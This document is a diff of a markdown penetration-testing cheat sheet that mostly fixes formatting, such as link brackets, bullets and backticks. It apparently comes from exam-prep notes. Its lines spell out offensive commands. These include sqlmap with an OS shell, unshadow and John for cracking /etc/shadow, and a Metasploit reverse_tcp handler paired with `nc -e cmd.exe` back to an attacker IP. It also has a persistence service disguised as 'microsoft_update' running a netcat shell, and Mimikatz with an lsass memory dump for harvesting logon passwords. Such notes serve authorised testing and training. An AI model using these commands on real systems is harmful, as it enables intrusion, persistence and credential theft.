@@ -25,7 +25,7 @@ Intense scan - `nmap -p 1-65535 -T4 -A -v <IP>`
 `wpscan –url http://<IP>/ –enumerate p`  
 [File Include Resource 1](https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/)  
 [File Include Resource 2](http://www.hackersonlineclub.com/lfi-rfi)  
-[File Include Resource 3(https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)  
+[File Include Resource 3](https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)  
 
 #### SMB/RPC  
 `enum4linux -a <IP>`  
@@ -40,12 +40,11 @@ Intense scan - `nmap -p 1-65535 -T4 -A -v <IP>`
 `nmblookup -A target`  
 
 #### SQL  
+[SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
+[Backdoor SQL Injection](http://resources.infosecinstitute.com/backdoor-sql-injection/)  
 `nmap -sV -Pn -vv –script=mysql* <IP> -p <PORT>`  
 `sqlmap -u <IP> –crawl=1`  
 `sqlmap -u http://<IP>/page.php?commen=761 –DBMS=mysql –os-shell`  
-[SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
-[Backdoor SQL Injection](http://resources.infosecinstitute.com/backdoor-sql-injection/)  
-
 
 #### SMTP  
 `nmap –script=smtp* -p <PORT> <IP>`  
@@ -74,14 +73,14 @@ Intense scan - `nmap -p 1-65535 -T4 -A -v <IP>`
 ***
 
 #### Password Cracking  
-Discover type of hash that you have
+Discover type of hash that you have  
 `hash-identifier`  
 
 #### John the Ripper  
 ##### /etc/shadow cracking  
  - Create a file with passwd
  - Create a file with shadow
- - Combine into one document
+ - Combine into one document  
    `-unshadow <passwd file location> <shadow file location> > <new combined file>`  
 `john --wordlist=<any word list> <combined file location>`  
 
@@ -110,19 +109,19 @@ See msfvenom cheat sheet
 
 #### Turn a regular shell into a meterpreter shell  
 ##### Attacker  
-`use exploit/multi/handler`  
-`set payload windows/shell/reverse_tcp`  
-`set lhost <IP>`  
-`set lport <PORT>`  
-`run`  
+- `use exploit/multi/handler`  
+- `set payload windows/shell/reverse_tcp`  
+- `set lhost <IP>`  
+- `set lport <PORT>`  
+- `run`  
 ##### Target  
-`nc -vn <IP> <PORT> -e cmd.exe`  
+- `nc -vn <IP> <PORT> -e cmd.exe`  
 ##### Attacker  
-Ctrl+Z (to background session)
-`sessions -l` (this will list your sessions to verify which one it is)
-`setg rhost <IP>`  
-`setg lhost <IP>`  
-`sessions -u 1` (the 1 is the session number)
+- Ctrl+Z (to background session)
+- `sessions -l` (this will list your sessions to verify which one it is)
+- `setg rhost <IP>`  
+- `setg lhost <IP>`  
+- `sessions -u 1` (the 1 is the session number)
 
 #### Netcat  
 See netcat cheat sheet
@@ -137,7 +136,7 @@ See netcat cheat sheet
 `search dir/s *.doc`  
 `system(“start cmd.exe /k $cmd”)`  
 `sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d <IP> <PORT> -e cmd.exe” start= auto error= ignore`  
-`/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv <IP> <PORT>`  
+`C:\nc.exe -e c:\windows\system32\cmd.exe -vv <IP> <PORT>`  
 `mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”`  
 `Procdump.exe -accepteula -ma lsass.exe lsass.dmp`  
 `mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”`  
@@ -152,18 +151,18 @@ See netcat cheat sheet
 `type %WINDRIVE%\System32\drivers\etc\hosts`  
 
 #### Useful Nix Commands  
-SUID root files`  
+SUID root files
 `find / -user root -perm -4000 -print`  
 SGID root files:
 `find / -group root -perm -2000 -print`  
 SUID & SGID files ownership
 `find / -perm -4000 -o -perm -2000 -print`  
 Files not owned by anyone
-find / -nouser -print`  
+`find / -nouser -print`  
 Files not owned by any group
-find / -nogroup -print`  
+`find / -nogroup -print`  
 Symlinks and their pointers
-find / -type l -ls`  
+`find / -type l -ls`  
 
 
 #### Download an EXE from FTP server  
@@ -175,7 +174,7 @@ find / -type l -ls`
 `ftp -s:script.txt`  
 
 #### Shells  
-See resources section
+See resources section  
 [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  
 
 # Post  
@@ -225,20 +224,21 @@ See resources section
 ***
 
 #### Quick Kali Configuration  
-SSH
-Start
+
+##### SSH  
+- Start  
 `service ssh start`  
-Stop
+- Stop  
 `service ssh stop`  
 
 #### HTTP Service  
-Start
+- Start  
 `service apache2 start`  
-Verify its running
+- Verify its running  
 `http://127.0.0.1`  
-Directory
+- Directory  
 /var/www/
-Stop
+- Stop  
 `service apache2 stop`  
 
 #### Update boot sequence  
@@ -247,9 +247,9 @@ Stop
 `rcconf (GUI)`  
 
 #### Compiling Exploits  
-32-bit
+32-bit  
 `gcc -m32 -o output32 hello.c`  
-64-bit
+64-bit  
 `gcc -o output hello.c`  
 
 #### Windows Compiling  
